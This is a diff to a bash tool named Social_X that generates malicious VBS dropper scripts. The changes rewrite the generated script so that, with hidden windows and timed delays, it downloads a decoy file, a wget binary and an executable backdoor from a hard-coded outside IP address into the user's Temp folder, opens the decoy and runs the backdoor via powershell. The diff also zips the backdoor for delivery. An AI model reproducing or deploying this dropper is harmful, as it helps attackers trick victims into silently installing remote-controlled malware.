@@ -10,7 +10,7 @@ function banner(){
     figlet Social_X -f banner/larry3d.flf 
     echo ${green} ------------------------------------------------------------------
     echo -e "                         By:Aziz Kaplan" 
-    echo -e "                          Version:1.1" 
+    echo -e "                          Version:1.2" 
     echo ${green} ------------------------------------------------------------------
 }
 
@@ -115,7 +115,7 @@ function binder() {
                 clear
                 banner
                 echo "${green}[+]${lightblue}Your Backdoor Has To Be In The Social_X/ Folder."
-                wine /home/kali/.wine/drive_c/Program\ Files\ \(x86\)/dennisbabkin.com/Script\ Encoder\ Plus/ScrEncGui.exe /dev/null 2> /dev/null 
+                #wine /home/kali/.wine/drive_c/Program\ Files\ \(x86\)/dennisbabkin.com/Script\ Encoder\ Plus/ScrEncGui.exe /dev/null 2> /dev/null 
                 zip $exe_file.zip $exe_file
                 rm $exe_file
                 cp $exe_file.zip SOCIALX_BACKDOOR/
@@ -223,16 +223,20 @@ function visualbasic() {
     binder_vbs_code2='Dim strArgs1'
     binder_vbs_code3='Dim strArgs2'
     binder_vbs_code4='Dim strArgs3'
-    binder_vbs_code5='strArgs = "cmd /c curl http://34.253.220.69/'$file' -o %homepath%/AppData/Local/Temp/'$file'"'
-    binder_vbs_code6='strArgs1 = "cmd /c curl http://34.253.220.69/'$exe_file' -o %homepath%/AppData/Local/Temp/'$exe_file'"'
-    binder_vbs_code7='strArgs2 = "cmd /c start %homepath%/AppData/Local/Temp/'$file'"'
-    binder_vbs_code8='strArgs3 = "cmd /c start %homepath%/AppData/Local/Temp/'$exe_file'"'
-    binder_vbs_code9='oShell.Run strArgs, 0, false'
-    binder_vbs_code10='WScript.Sleep(2000)'
-    binder_vbs_code11='oShell.Run strArgs2, 0, false'
-    binder_vbs_code12='oShell.Run strArgs1, 0, false'
-    binder_vbs_code13='WScript.Sleep(180000)'
-    binder_vbs_code14='oShell.Run strArgs3, 0, false'
+    binder_vbs_code5='Dim strArgs4'
+    binder_vbs_code6='strArgs = "cmd /c curl http://34.253.220.69/'$file' -o %homepath%/AppData/Local/Temp/'$file'"'
+    binder_vbs_code7='strArgs1 = "cmd /c curl http://34.253.220.69/wget.exe -o %homepath%/AppData/Local/Temp/wget.exe"'
+    binder_vbs_code8='strArgs2 = "%homepath%\AppData\Local\Temp\wget.exe -P %homepath%/AppData/Local/Temp/ http://34.253.220.69/'$exe_file'"'
+    binder_vbs_code9='strArgs3 = "cmd /c start %homepath%/AppData/Local/Temp/'$file'"'
+    binder_vbs_code10='strArgs4 = "powershell %homepath%/AppData/Local/Temp/'$exe_file'"'
+    binder_vbs_code11='oShell.Run strArgs, 0, false'
+    binder_vbs_code12='WScript.Sleep(2000)'
+    binder_vbs_code13='oShell.Run strArgs3, 0, false'
+    binder_vbs_code14='oShell.Run strArgs1, 0, false'
+    binder_vbs_code15='WScript.Sleep(15000)'
+    binder_vbs_code16='oShell.Run strArgs2, 0, false'
+    binder_vbs_code17='WScript.Sleep(180000)'
+    binder_vbs_code18='oShell.Run strArgs4, 0, false'
     
     ########################################################################################################################
     echo $binder_vbs_code > SOCIALX_VBS/socialx.vbs
@@ -250,8 +254,10 @@ function visualbasic() {
     echo $binder_vbs_code12 >> SOCIALX_VBS/socialx.vbs
     echo $binder_vbs_code13 >> SOCIALX_VBS/socialx.vbs
     echo $binder_vbs_code14 >> SOCIALX_VBS/socialx.vbs
-
-
+	echo $binder_vbs_code15 >> SOCIALX_VBS/socialx.vbs
+	echo $binder_vbs_code16 >> SOCIALX_VBS/socialx.vbs
+	echo $binder_vbs_code17 >> SOCIALX_VBS/socialx.vbs
+	echo $binder_vbs_code18 >> SOCIALX_VBS/socialx.vbs
 }
 function left2right() {
     echo "${green}[+]${lightblue}Chromium Will Be Opened.Please Click To ${RED}COPY ${lightblue} Button."
